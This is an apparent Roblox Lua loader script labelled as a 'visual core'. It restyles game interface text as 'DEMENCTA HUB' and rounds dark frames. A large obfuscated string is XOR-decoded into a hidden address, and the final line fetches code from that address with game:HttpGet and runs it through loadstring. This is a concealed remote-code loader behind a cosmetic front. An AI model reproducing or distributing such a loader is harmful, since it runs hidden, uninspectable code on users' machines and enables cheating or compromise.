
--[[ STAGE 2: VISUAL CORE ]]
local oUeVxVhCsA3aGaqdS5dTI="\079\064\093\094\088\046\022\019\109\091\098\040\108\103\121\098\114\098\140\139\118\134\114\131\129\152\132\152\175\082\154\171\170\101\163\191\189\167\184\189\178\187\203\195\207\129\203\216\222\193\214\231\218\236\233\163\226\235\224\248\180\210\248\003\248\226\012\002\006\007\018\029\000\251\039\035\046\034\044\062\040\247\034\045\070\055\071\094\090\095\074\062\110\094\094\100\063\038\056\032\056\105\082\115\138\138\118\113\116\139\091\134\086\158\156\155\107\106\169\189\174"local OlQyYb4bV1J0oMOXN3eJY=143 local _T7j5j8GLaH0Rg3gQAwmbL=68 local gql02B3bflo4oH4ivk=1 local cGOK4DFcGQvu3R0=3 local Z1q7iuwy7VMy=17 local vJiwpRM8O6lEyja=false local DVUW1PCKMYDYmjG=bit32 and bit32.bxor if not DVUW1PCKMYDYmjG then DVUW1PCKMYDYmjG=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local d7lbRFwq1JMHDjjMJOosT={}for tvcVok_oELI4HNFoVSL71=1,#oUeVxVhCsA3aGaqdS5dTI do local Z_vj7yL_Vv6mIv=string.byte(oUeVxVhCsA3aGaqdS5dTI,tvcVok_oELI4HNFoVSL71)local rpcIW4M9vAPVb=(_T7j5j8GLaH0Rg3gQAwmbL+(tvcVok_oELI4HNFoVSL71*cGOK4DFcGQvu3R0)+Z1q7iuwy7VMy)%256 if gql02B3bflo4oH4ivk==0 then Z_vj7yL_Vv6mIv=(Z_vj7yL_Vv6mIv-rpcIW4M9vAPVb)%256 d7lbRFwq1JMHDjjMJOosT[tvcVok_oELI4HNFoVSL71]=string.char(DVUW1PCKMYDYmjG(Z_vj7yL_Vv6mIv,OlQyYb4bV1J0oMOXN3eJY))else Z_vj7yL_Vv6mIv=DVUW1PCKMYDYmjG(Z_vj7yL_Vv6mIv,OlQyYb4bV1J0oMOXN3eJY)d7lbRFwq1JMHDjjMJOosT[tvcVok_oELI4HNFoVSL71]=string.char((Z_vj7yL_Vv6mIv-rpcIW4M9vAPVb)%256)end end local yxshYTUe7qjEGjX=table.concat(d7lbRFwq1JMHDjjMJOosT)if vJiwpRM8O6lEyja then yxshYTUe7qjEGjX=string.reverse(yxshYTUe7qjEGjX)end local oHBdBQ5A4lAJqTBDhIxp=yxshYTUe7qjEGjX
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(oHBdBQ5A4lAJqTBDhIxp))()
